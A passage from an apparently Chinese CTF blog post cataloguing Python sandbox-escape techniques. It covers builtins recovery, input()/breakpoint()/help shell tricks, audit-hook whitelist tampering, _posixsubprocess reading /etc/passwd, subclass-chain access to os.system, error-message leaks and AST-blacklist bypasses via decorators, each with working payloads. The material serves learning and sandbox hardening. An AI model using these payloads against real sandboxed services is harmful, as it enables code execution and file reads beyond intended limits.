class="line">    while True:</span><br><span class="line">        try:</span><br><span class="line">            code = input(&#x27;&gt;&gt;&gt; &#x27;)</span><br><span class="line">            try:</span><br><span class="line">                # Try to eval the code first.</span><br><span class="line">                result = eval(code, global_namespace, local_namespace)</span><br><span class="line">            except SyntaxError:</span><br><span class="line">                # If a SyntaxError occurs, this might be because the user entered a statement,</span><br><span class="line">                # in which case we should use exec.</span><br><span class="line">                exec(code, global_namespace, local_namespace)</span><br><span class="line">            else:</span><br><span class="line">                print(result)</span><br><span class="line">        except EOFError:</span><br><span class="line">            break</span><br><span class="line">        except Exception as e:</span><br><span class="line">            print(f&quot;Error: &#123;e&#125;&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    repl()</span><br></pre></td></tr></table></figure>

<h3 id="限制部分模块"><a href="#限制部分模块" class="headerlink" title="限制部分模块"></a>限制部分模块</h3><p>exec 函数的第二个参数可以指定命名空间<br>可以通过获取其他命名空间里的 __builtins__绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__import__(&#x27;types&#x27;).__builtins__</span><br><span class="line">__import__(&#x27;string&#x27;).__builtins__</span><br></pre></td></tr></table></figure>

<h3 id="清空builtins"><a href="#清空builtins" class="headerlink" title="清空builtins"></a>清空builtins</h3><p>使用Python继承链获取</p>
<h2 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h2><h3 id="交互式"><a href="#交互式" class="headerlink" title="交互式"></a>交互式</h3><p>input<br>传入一个 input 打开一个新的输入流，然后再输入最终的 payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(input())</span><br></pre></td></tr></table></figure>

<p>sys.stdin.read()<br>注意输入完毕之后按 ctrl+d 结束输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(sys.stdin.read())</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br><span class="line">kali</span><br><span class="line">0</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>

<p>sys.stdin.readline()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(sys.stdin.readline())</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p>sys.stdin.readlines()</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(sys.stdin.readlines()[0])</span><br><span class="line">__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)</span><br></pre></td></tr></table></figure>

<p>在python 2中，input 函数从标准输入接收输入之后会自动 eval 求值。因此无需在前面加上 eval。但 raw_input 不会自动 eval。</p>
<p>breakpoint<br>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p>
<p>help<br>help 函数可以打开帮助文档. 索引到 os 模块之后可以打开 sh<br>然后输入 os,此时会进入 os 的帮助文档。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">help&gt; os</span><br></pre></td></tr></table></figure>
<p>然后在输入 !sh就可以拿到 &#x2F;bin&#x2F;sh, 输入 !bash则可以拿到 &#x2F;bin&#x2F;bash</p>
<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><p>例如Flask，通过HTTP传入参数，与SSTI的打法类似</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[request.args.a]</span><br><span class="line">lipsum.__globals__.os[request.args.a]</span><br></pre></td></tr></table></figure>

<h2 id="多行限制"><a href="#多行限制" class="headerlink" title="多行限制"></a>多行限制</h2><h3 id="exec"><a href="#exec" class="headerlink" title="exec"></a>exec</h3><p>exec 可以支持换行符与;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; eval(&quot;exec(&#x27;__import__(\&quot;os\&quot;)\\nprint(1)&#x27;)&quot;)</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<h3 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h3><p>compile 在 single 模式下也同样可以使用 \n 进行换行, 在 exec 模式下可以直接执行多行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;&#x27;&#x27;eval(compile(&#x27;print(&quot;hello world&quot;); print(&quot;heyy&quot;)&#x27;, &#x27;&lt;stdin&gt;&#x27;, &#x27;exec&#x27;))&#x27;&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="海象表达式"><a href="#海象表达式" class="headerlink" title="海象表达式"></a>海象表达式</h3><p>海象表达式是 Python 3.8 引入的一种新的语法特性，用于在表达式中同时进行赋值和比较操作</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;expression&gt; := &lt;value&gt; if &lt;condition&gt; else &lt;value&gt;</span><br></pre></td></tr></table></figure>

<p>借助海象表达式，可以通过列表来替代多行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(&#x27;[a:=__import__(&quot;os&quot;),b:=a.system(&quot;id&quot;)]&#x27;)</span><br></pre></td></tr></table></figure>

<h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><p>在 Python 中，sys 模块提供了许多与 Python 解释器和其环境交互的功能，包括对全局变量和函数的操作。在沙箱中获取 sys 模块就可以达到变量覆盖与函数擦篡改的目的.</p>
<p>sys.modules 存放了现有模块的引用, 通过访问 sys.modules[‘__main__‘]就可以访问当当前模块定义的所有函数以及全局变量</p>
<p>除了通过 sys 模块来获取当前模块的变量以及函数外,还可以通过 __builtins__篡改内置函数</p>
<h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>gc模块主要的功能是提供一个接口供开发者直接与 Python 的垃圾回收机制进行交互</p>
<p>gc.collect(generation&#x3D;2)：这个函数会立即触发一次垃圾回收。你可以通过 generation参数指定要收集的代数。Python 的垃圾回收器是分代的，新创建的对象在第一代，经历过一次垃圾回收后仍然存活的对象会被移到下一代。</p>
<p>gc.get_objects()：这个函数会返回当前被管理的所有对象的列表。</p>
<p>gc.get_referrers(*objs)：这个函数会返回指向 objs中任何一个对象的对象列表。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">for obj in gc.get_objects():</span><br><span class="line">    if &#x27;__name__&#x27; in dir(obj):</span><br><span class="line">        if &#x27;__main__&#x27; in obj.__name__:</span><br><span class="line">            print(&#x27;Found module __main__&#x27;)</span><br><span class="line">            mod_main = obj</span><br><span class="line">        if &#x27;os&#x27; == obj.__name__:</span><br><span class="line">            print(&#x27;Found module os&#x27;)</span><br><span class="line">            mod_os = obj</span><br><span class="line">mod_main.__exit = lambda x : print(&quot;[+] bypass&quot;)</span><br></pre></td></tr></table></figure>

<p>一些版本会触发 gc.get_objects hook 导致无法成功</p>
<h3 id="traceback"><a href="#traceback" class="headerlink" title="traceback"></a>traceback</h3><p>主动抛出异常, 并获取其后要执行的代码, 然后将__exit进行替换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    raise Exception()</span><br><span class="line">except Exception as e:</span><br><span class="line">    _, _, tb = sys.exc_info()</span><br><span class="line">    nxt_frame = tb.tb_frame</span><br><span class="line"></span><br><span class="line">    # Walk up stack frames until we find one which</span><br><span class="line">    # has a reference to the audit function</span><br><span class="line">    while nxt_frame:</span><br><span class="line">        if &#x27;audit&#x27; in nxt_frame.f_globals:</span><br><span class="line">            break</span><br><span class="line">        nxt_frame = nxt_frame.f_back</span><br><span class="line"></span><br><span class="line">    # Neuter the __exit function</span><br><span class="line">    nxt_frame.f_globals[&#x27;__exit&#x27;] = print</span><br><span class="line"></span><br><span class="line">    # Now we&#x27;re free to call whatever we want</span><br><span class="line">    os.system(&#x27;cat /flag*&#x27;)</span><br></pre></td></tr></table></figure>

<p>一些版本会触发object.__getattr__hook</p>
<h2 id="audit-hook"><a href="#audit-hook" class="headerlink" title="audit hook"></a>audit hook</h2><p>Python 的审计事件包括一系列可能影响到 Python 程序运行安全性的重要操作。这些事件的种类及名称不同版本的 Python 解释器有所不同，且可能会随着 Python 解释器的更新而变动</p>
<p>import：发生在导入模块时。</p>
<p>open：发生在打开文件时。</p>
<p>write：发生在写入文件时。</p>
<p>exec：发生在执行Python代码时。</p>
<p>compile：发生在编译Python代码时。</p>
<p>socket：发生在创建或使用网络套接字时。</p>
<p>os.system，os.popen等：发生在执行操作系统命令时。</p>
<p>subprocess.Popen，subprocess.run等：发生在启动子进程时。</p>
<h3 id="loader"><a href="#loader" class="headerlink" title="__loader__"></a>__loader__</h3><p>__loader__实际上指向的是 _frozen_importlib.BuiltinImporter类,也可以通过别的方式进行获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[84]</span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; __loader__</span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br><span class="line">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[84].__name__</span><br><span class="line">&#x27;BuiltinImporter&#x27;</span><br><span class="line">&gt;&gt;&gt; [x for x in ().__class__.__base__.__subclasses__() if &#x27;BuiltinImporter&#x27; in x.__name__][0]</span><br><span class="line">&lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;</span><br></pre></td></tr></table></figure>
<p>__loader__.load_module也有一个缺点就是无法导入非内建模块</p>
<h3 id="posixsubprocess"><a href="#posixsubprocess" class="headerlink" title="_posixsubprocess"></a>_posixsubprocess</h3><p>_posixsubprocess模块是 Python 的内部模块，提供了一个用于在 UNIX 平台上创建子进程的低级别接口。subprocess 模块的实现就用到了_posixsubprocess.</p>
<p>该模块的核心功能是 fork_exec 函数，fork_exec 提供了一个非常底层的方式来创建一个新的子进程，并在这个新进程中执行一个指定的程序。但这个模块并没有在 Python 的标准库文档中列出,每个版本的 Python 可能有所差异.</p>
<p>3.11</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">def fork_exec(</span><br><span class="line">    __process_args: Sequence[StrOrBytesPath] | None,</span><br><span class="line">    __executable_list: Sequence[bytes],</span><br><span class="line">    __close_fds: bool,</span><br><span class="line">    __fds_to_keep: tuple[int, ...],</span><br><span class="line">    __cwd_obj: str,</span><br><span class="line">    __env_list: Sequence[bytes] | None,</span><br><span class="line">    __p2cread: int,</span><br><span class="line">    __p2cwrite: int,</span><br><span class="line">    __c2pred: int,</span><br><span class="line">    __c2pwrite: int,</span><br><span class="line">    __errread: int,</span><br><span class="line">    __errwrite: int,</span><br><span class="line">    __errpipe_read: int,</span><br><span class="line">    __errpipe_write: int,</span><br><span class="line">    __restore_signals: int,</span><br><span class="line">    __call_setsid: int,</span><br><span class="line">    __pgid_to_set: int,</span><br><span class="line">    __gid_object: SupportsIndex | None,</span><br><span class="line">    __groups_list: list[int] | None,</span><br><span class="line">    __uid_object: SupportsIndex | None,</span><br><span class="line">    __child_umask: int,</span><br><span class="line">    __preexec_fn: Callable[[], None],</span><br><span class="line">    __allow_vfork: bool,</span><br><span class="line">) -&gt; int: ...</span><br></pre></td></tr></table></figure>
<p>__process_args: 传递给新进程的命令行参数，通常为程序路径及其参数的列表。</p>
<p>__executable_list: 可执行程序路径的列表。</p>
<p>__close_fds: 如果设置为True，则在新进程中关闭所有的文件描述符。</p>
<p>__fds_to_keep: 一个元组，表示在新进程中需要保持打开的文件描述符的列表。</p>
<p>__cwd_obj: 新进程的工作目录。</p>
<p>__env_list: 环境变量列表，它是键和值的序列，例如：[“PATH&#x3D;&#x2F;usr&#x2F;bin”, “HOME&#x3D;&#x2F;home&#x2F;user”]。</p>
<p>__p2cread, __p2cwrite, __c2pred, __c2pwrite, __errread, __errwrite: 这些是文件描述符，用于在父子进程间进行通信。</p>
<p>__errpipe_read, __errpipe_write: 这两个文件描述符用于父子进程间的错误通信。</p>
<p>__restore_signals: 如果设置为1，则在新创建的子进程中恢复默认的信号处理。</p>
<p>__call_setsid: 如果设置为1，则在新进程中创建新的会话。</p>
<p>__pgid_to_set: 设置新进程的进程组 ID。</p>
<p>__gid_object, __groups_list, __uid_object: 这些参数用于设置新进程的用户ID 和组 ID。</p>
<p>__child_umask: 设置新进程的 umask。</p>
<p>__preexec_fn: 在新进程中执行的函数，它会在新进程的主体部分执行之前调用。</p>
<p>__allow_vfork: 如果设置为True，则在可能的情况下使用 vfork 而不是 fork。vfork 是一个更高效的 fork，但是使用 vfork 可能会有一些问题 。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__loader__.load_module(&#x27;_posixsubprocess&#x27;).fork_exec([b&quot;/bin/cat&quot;,&quot;/etc/passwd&quot;], [b&quot;/bin/cat&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__loader__.load_module(&#x27;os&#x27;).pipe()), False, False,False, None, None, None, -1, None, False)</span><br></pre></td></tr></table></figure>

<h3 id="篡改内置函数"><a href="#篡改内置函数" class="headerlink" title="篡改内置函数"></a>篡改内置函数</h3><p>修改白名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WHITED_EVENTS = set(&#123;&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;, &#x27;exec&#x27;, &#x27;compile&#x27;&#125;)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.set = lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">exec(&quot;for k,v in enumerate(globals()[&#x27;__builtins__&#x27;]): print(k,v)&quot;)</span><br><span class="line"></span><br><span class="line">exec(&quot;globals()[&#x27;__builtins__&#x27;][&#x27;set&#x27;]=lambda x: [&#x27;builtins.input&#x27;, &#x27;builtins.input/result&#x27;,&#x27;exec&#x27;, &#x27;compile&#x27;, &#x27;os.system&#x27;]\nimport os\nos.system(&#x27;cat flag2.txt&#x27;)&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="不导入而获取模块"><a href="#不导入而获取模块" class="headerlink" title="不导入而获取模块"></a>不导入而获取模块</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 获取 sys</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;wrapper&quot; not in str(x.__init__) and &quot;sys&quot; in x.__init__.__globals__ ][0][&quot;sys&quot;]</span><br><span class="line"></span><br><span class="line"># 获取 os</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if &quot;&#x27;_sitebuiltins.&quot; in str(x) and not &quot;_Helper&quot; in str(x) ][0][&quot;sys&quot;].modules[&quot;os&quot;]</span><br><span class="line"></span><br><span class="line"># 其他的 payload 也都不会触发</span><br><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="Opcode"><a href="#Opcode" class="headerlink" title="Opcode"></a>Opcode</h2><h3 id="修改co-code"><a href="#修改co-code" class="headerlink" title="修改co_code"></a>修改co_code</h3><p>python3.11引入专用字节码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import dis</span><br><span class="line">class OpGet:</span><br><span class="line">    def __getattr__(self, op):</span><br><span class="line">        return dis._all_opmap[op]</span><br><span class="line">O = OpGet()</span><br><span class="line"></span><br><span class="line">name = &#x27;breakpoint&#x27;</span><br><span class="line">cod = bytes([</span><br><span class="line">    O.LOAD_GLOBAL_BUILTIN, 1,</span><br><span class="line">    6, 0, # index, 0</span><br><span class="line">    6, 0, # index, 0</span><br><span class="line">    6, 0, # module key version, 0</span><br><span class="line">    6, 0, # builtins key version, 0</span><br><span class="line">    O.CALL_PY_EXACT_ARGS, 0,</span><br><span class="line">    6, 0, # index, 0</span><br><span class="line">    6, 0, # module key version, 0</span><br><span class="line">    6, 0, # builtins key version, 0</span><br><span class="line">    O.LOAD_ATTR_CLASS, 0,</span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from opcode import opmap</span><br><span class="line"></span><br><span class="line">code = bytes([</span><br><span class="line">    111, 1, # LOAD_GLOBAL_BUILTIN</span><br><span class="line">    6,6,6,6,6,6,6,6, # trash</span><br><span class="line">    29, 0, # CALL_BUILTIN_CLASS</span><br><span class="line">    6,6,6,6,6,6, # other trash</span><br><span class="line">    191,0 # unknown opcode -&gt; error</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(code.hex())</span><br></pre></td></tr></table></figure>

<h2 id="输出限制"><a href="#输出限制" class="headerlink" title="输出限制"></a>输出限制</h2><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><p>KeyError（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</p>
<p>FileNotFoundError（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</p>
<p>ValueError（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</p>
<p>KeyError<br>KeyError 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;1&quot;:&quot;2&quot;&#125;[_]</span><br><span class="line">&#x27;varxxx&#x27;</span><br></pre></td></tr></table></figure>

<p>FileNotFoundError<br>FileNotFoundError 出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>
<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">open(_)</span><br><span class="line">[Errno 2] No such file or directory: &#x27;varxxx&#x27;</span><br></pre></td></tr></table></figure>

<p>ValueError<br>ValueError 比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int(_)</span><br><span class="line">ValueError: invalid literal for int() with base 10: &#x27;varxxx</span><br></pre></td></tr></table></figure>

<h2 id="AST沙箱"><a href="#AST沙箱" class="headerlink" title="AST沙箱"></a>AST沙箱</h2><p>Python 的抽象语法树（AST，Abstract Syntax Tree）是一种用来表示 Python 源代码的树状结构。在这个树状结构中，每个节点都代表源代码中的一种结构，如一个函数调用、一个操作符、一个变量等。Python 的 ast 模块提供了一种机制来解析 Python 源代码并生成这样的抽象语法树。</p>
<p>ast.Module: 表示一个整个的模块或者脚本。</p>
<p>ast.FunctionDef: 表示一个函数定义。</p>
<p>ast.AsyncFunctionDef: 表示一个异步函数定义。</p>
<p>ast.ClassDef: 表示一个类定义。</p>
<p>ast.Return: 表示一个return语句。</p>
<p>ast.Delete: 表示一个del语句。</p>
<p>ast.Assign: 表示一个赋值语句。</p>
<p>ast.AugAssign: 表示一个增量赋值语句，如x +&#x3D; 1。</p>
<p>ast.For: 表示一个for循环。</p>
<p>ast.While: 表示一个while循环。</p>
<p>ast.If: 表示一个if语句。</p>
<p>ast.With: 表示一个with语句。</p>
<p>ast.Raise: 表示一个raise语句。</p>
<p>ast.Try: 表示一个try&#x2F;except语句。</p>
<p>ast.Import: 表示一个import语句。</p>
<p>ast.ImportFrom: 表示一个from…import…语句。</p>
<p>ast.Expr: 表示一个表达式。</p>
<p>ast.Call: 表示一个函数调用。</p>
<p>ast.Name: 表示一个变量名。</p>
<p>ast.Attribute: 表示一个属性引用，如x.y。<br>AST 沙箱会将用户的输入转化为操作码,一般情况下考虑绕过 AST 黑名单<br>打印AST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import ast </span><br><span class="line"></span><br><span class="line">BAD_ATS = &#123;</span><br><span class="line">  ast.Attribute,</span><br><span class="line">  ast.AST,</span><br><span class="line">  ast.Subscript,</span><br><span class="line">  ast.comprehension,</span><br><span class="line">  ast.Delete,</span><br><span class="line">  ast.Try,</span><br><span class="line">  ast.For,</span><br><span class="line">  ast.ExceptHandler,</span><br><span class="line">  ast.With,</span><br><span class="line">  ast.Import,</span><br><span class="line">  ast.ImportFrom,</span><br><span class="line">  ast.Assign,</span><br><span class="line">  ast.AnnAssign,</span><br><span class="line">  ast.Constant,</span><br><span class="line">  ast.ClassDef,</span><br><span class="line">  ast.AsyncFunctionDef,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">a = &#x27;&#x27;&#x27;</span><br><span class="line">[</span><br><span class="line">    system:=111,</span><br><span class="line">    bash:=222</span><br><span class="line">]</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for x in ast.walk(compile(a, &quot;&lt;QWB7th&gt;&quot;, &quot;exec&quot;, flags=ast.PyCF_ONLY_AST)):</span><br><span class="line">  if type(x) in BAD_ATS:</span><br><span class="line">    print(type(x))</span><br><span class="line">    exit()</span><br><span class="line"></span><br><span class="line">print(&quot;[+] OK&quot;)</span><br></pre></td></tr></table></figure>

<h3 id="ast-Call"><a href="#ast-Call" class="headerlink" title="ast.Call"></a>ast.Call</h3><p>装饰器<br>绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@exec</span><br><span class="line">@input</span><br><span class="line">class X:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@help</span><br><span class="line">class X:</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def fake_wrapper(f):</span><br><span class="line">  return &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">@getattr(os,&quot;system&quot;)</span><br><span class="line">@fake_wrapper</span><br><span class="line">def something():</span><br><span class="line">  pass</span><br></pre></td></tr></table></figure>

<p>自定义装饰器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line">def fake_wrapper(f):</span><br><span class="line">  return &#x27;/bin/sh&#x27;</span><br><span class="line"></span><br><span class="line">@os.system</span><br><span class="line">@fake_wrapper</span><br><span class="line">def something():</span><br><span class="line">  pass</span><br></pre></td></tr></table></figure>

<p>函数覆盖<br>obj[argument]实际上是调用的 obj.__getitem__方法.因此只需要覆盖其 __getitem__方法, 即可在使用 obj[argument]执行代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A:</span><br><span class="line">...     __getitem__ = exec</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; A()[&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;]</span><br></pre></td></tr></table></figure>

<p>metaclass<br>在 Python中，类本身也是对象，元类就是创建这些类（即类对象）的类。<br>类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性</p>
<p>在不使用构造函数的情况下触发</p>
